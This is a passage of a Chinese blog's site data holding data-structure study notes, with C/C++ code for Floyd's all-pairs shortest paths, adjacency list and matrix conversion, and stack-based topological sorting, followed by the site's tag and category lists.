= 0; i &lt; MAXV; i++) { p = LG-&gt;adjList[i].firstEdLGe; printf(&quot;%d:&quot;, i); while (p != NULL) { if (p-&gt;weiLGht != 32767) { printf(&quot;%2d[%d]-&gt;&quot;, p-&gt;adjVer, p-&gt;weiLGht); } p = p-&gt;nextEdLGe; } printf(&quot; NULL\\n&quot;); }}//输出邻接矩阵void displayAdjMat(MatGraph MG) { int i, j; for (i = 0; i &lt; MAXV; i++) { for (j = 0; j &lt; MAXV; j++) { if (MG.adjMat[i][j] == 0) { printf(&quot;%4s&quot;, &quot;0&quot;); } else if (MG.adjMat[i][j] == 32767) { printf(&quot;%4s&quot;, &quot;∞&quot;); } else { printf(&quot;%4d&quot;, MG.adjMat[i][j]); } } printf(&quot;\\n&quot;); }}//邻接表转换为邻接矩阵void ListToMat(ListGraph* LG, MatGraph&amp; MG) { int i, j; EdgeNode* p; for (i = 0; i &lt; MAXV; i++) { for (j = 0; j &lt; MAXV; j++) { MG.adjMat[i][j] = 0; } } for (i = 0; i &lt; LG-&gt;n; i++) { p = LG-&gt;adjList[i].firstEdLGe; while (p != NULL) { MG.adjMat[i][p-&gt;adjVer] = p-&gt;weiLGht; p = p-&gt;nextEdLGe; } } MG.n = LG-&gt;n; MG.e = LG-&gt;e;}//输出多源最短路径void displayPath(MatGraph MG, int A[MAXV][MAXV], int path[MAXV][MAXV]) { int i, j, k; int s; int aPath[MAXV]; //存放一条最短路径（逆向） int d; //顶点个数 for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { if (A[i][j] != INF &amp;&amp; i != j) { //若顶点 i 和 顶点 j 之间存在路径 printf(&quot;从 %d 到 %d 的路径为：&quot;, i, j); k = path[i][j]; d = 0; aPath[d] = j; //路径上添加终点 while (k != -1 &amp;&amp; k != i) { //路劲上添加中间点 d++; aPath[d] = k; k = path[i][k]; } d++; aPath[d] = i; //路径上添加起点 printf(&quot;%d&quot;, aPath[d]); //输出起点 for (s = d - 1; s &gt;= 0; s--) { //输出路径上其他顶点 printf(&quot;-&gt;%d&quot;, aPath[s]); } printf(&quot;\\t\\t&quot;); printf(&quot;路径长度为：%d\\n&quot;, A[i][j]); } } }}//Floyd算法void Floyd(MatGraph MG) { int i, j, k; int A[MAXV][MAXV]; int path[MAXV][MAXV]; for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { A[i][j] = MG.adjMat[i][j]; if (i != j &amp;&amp; MG.adjMat[i][j] &lt; INF) { path[i][j] = i; //顶点 i 到顶点 j 有边时 } else { path[i][j] = -1; //顶点 i 到顶点 j 无边时 } } } for (k = 0; k &lt; MG.n; k++) { //一次考察所有顶点 for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { if (A[i][j] &gt; A[i][k] + A[k][j]) { A[i][j] = A[i][k] + A[k][j]; //修改最短路径长度 path[i][j] = path[k][j]; //修改最短路径 } } } } displayPath(MG, A, path); //输出最短路径}int main() { ListGraph* LG; MatGraph MG; int array[MAXV][MAXV] = { { 0, 4, 6, 6,INF,INF,INF}, {INF, 0, 1,INF, 7,INF,INF}, {INF,INF, 0,INF, 6, 4,INF}, {INF,INF, 2, 0,INF, 5,INF}, {INF,INF,INF,INF, 0,INF, 6}, {INF,INF,INF,INF, 1, 0, 8}, {INF,INF,INF,INF,INF,INF, 0} }; int e = 12; createAdjListGraph(LG, array, MAXV, e); displayAdjList(LG); printf(&quot;\\n&quot;); ListToMat(LG, MG); displayAdjMat(MG); printf(&quot;\\n&quot;); Floyd(MG); printf(&quot;\\n&quot;); return 0;} 结果: 参考文章 1 参考文章 2 # 拓扑排序 # 原理 从 AOV 网中选择一个没有前驱的顶点并输出. 从网中删除该顶点和所有以它为起点的有向边. 重复直至 AOV 网为空或当前网中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环. # 栈实现拓扑排序（邻接表实现） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;stack&gt;#include &lt;cstring&gt;using namespace std;#define MAX_VERTEX_NUM 26typedef struct ArcNode { int adjvex; struct ArcNode *nextarc; ArcNode() { nextarc = NULL; }} ArcNode; //结点typedef struct VNode { int data; ArcNode *firstarc; VNode() { firstarc = NULL; }} VNode, AdjList[MAX_VERTEX_NUM];typedef struct { AdjList vertices; int vexnum, arcnum;} ALGraph;bool TopologicalSort(ALGraph G, int *indegree) { stack&lt;int&gt; s; //初始化栈 int i, k; for (i = 1; i &lt; G.vexnum + 1; i++) { if (!indegree[i]) s.push(i); //入度为0的顶点入栈 } int count = 0; //记录当前已经输出的顶点数 ArcNode *p; while (!s.empty()) { i = s.top(); s.pop(); cout &lt;&lt; G.vertices[i].data &lt;&lt; &quot;-&gt;&quot;; count++; for (p = G.vertices[i].firstarc; p; p = p-&gt;nextarc) { k = p-&gt;adjvex; indegree[k]--; //将所有指向i的顶点的入度减一，并且将入度为0的顶点压入栈s if (!indegree[k]) s.push(k); } } if (count &lt; G.vexnum) return false; return true;}int main() { int i; ALGraph g; cout &lt;&lt; &quot;载入图中...&quot; &lt;&lt; endl; ifstream fin(&quot;in.txt&quot;); fin &gt;&gt; g.vexnum &gt;&gt; g.arcnum; for (i = 1; i &lt; g.vexnum + 1; i++) g.vertices[i].data = i; int b, e; ArcNode *p; int *indegree = new int[g.vexnum + 1]; //注意 int *a=new int(n); 申请一个整型变量空间，赋初值为n，并定义一个整型指针a指向该地址空间 //int *indegree=(int *)malloc(sizeof(int)*(g.vexnum+1)); memset(indegree, 0, sizeof(int) * (g.vexnum + 1)); for (i = 1; i &lt; g.arcnum + 1; i++) { fin &gt;&gt; b &gt;&gt; e; cout &lt;&lt; &quot;第&quot; &lt;&lt; i &lt;&lt; &quot;条边：&quot; &lt;&lt; b &lt;&lt; &quot;-&gt;&quot; &lt;&lt; e &lt;&lt; endl; p = new ArcNode(); p-&gt;adjvex = e; p-&gt;nextarc = g.vertices[b].firstarc; g.vertices[b].firstarc = p; indegree[e]++; } if (TopologicalSort(g, indegree)) cout &lt;&lt; &quot;正常完成！&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;该有向图有回路！&quot; &lt;&lt; endl; return 0;} 测试数据，新建 in.txt 文件输入内容 1）有环 4 4 1 2 2 3 3 4 4 2 2）无环 12 16 1 2 1 3 2 3 1 4 3 5 4 5 11 6 5 7 3 7 3 8 6 8 9 10 9 11 9 12 10 12 1 12 结果: 参考文章 https://cloud.tencent.com/developer/article/1569368","link":"/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/"}],"tags":[{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"Kernel","slug":"Kernel","link":"/tags/Kernel/"},{"name":"qemu","slug":"qemu","link":"/tags/qemu/"},{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"flask","slug":"flask","link":"/tags/flask/"},{"name":"leetcode","slug":"leetcode","link":"/tags/leetcode/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"数据结构","slug":"数据结构","link":"/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"categories":[{"name":"pwn","slug":"pwn","link":"/categories/pwn/"},{"name":"Kernel","slug":"Kernel","link":"/categories/Kernel/"},{"name":"qemu","slug":"qemu","link":"/categories/qemu/"},{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"flask","slug":"flask","link":"/categories/flask/"},{"name":"leetcode","slug":"leetcode","link":"/categories/leetcode/"},{"name":"pwnable.tw","slug":"pwnable-tw","link":"/categories/pwnable-tw/"},{"name":"vue","slug":"vue","link":"/categories/vue/"},{"name":"数据结构","slug":"数据结构","link":"/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]}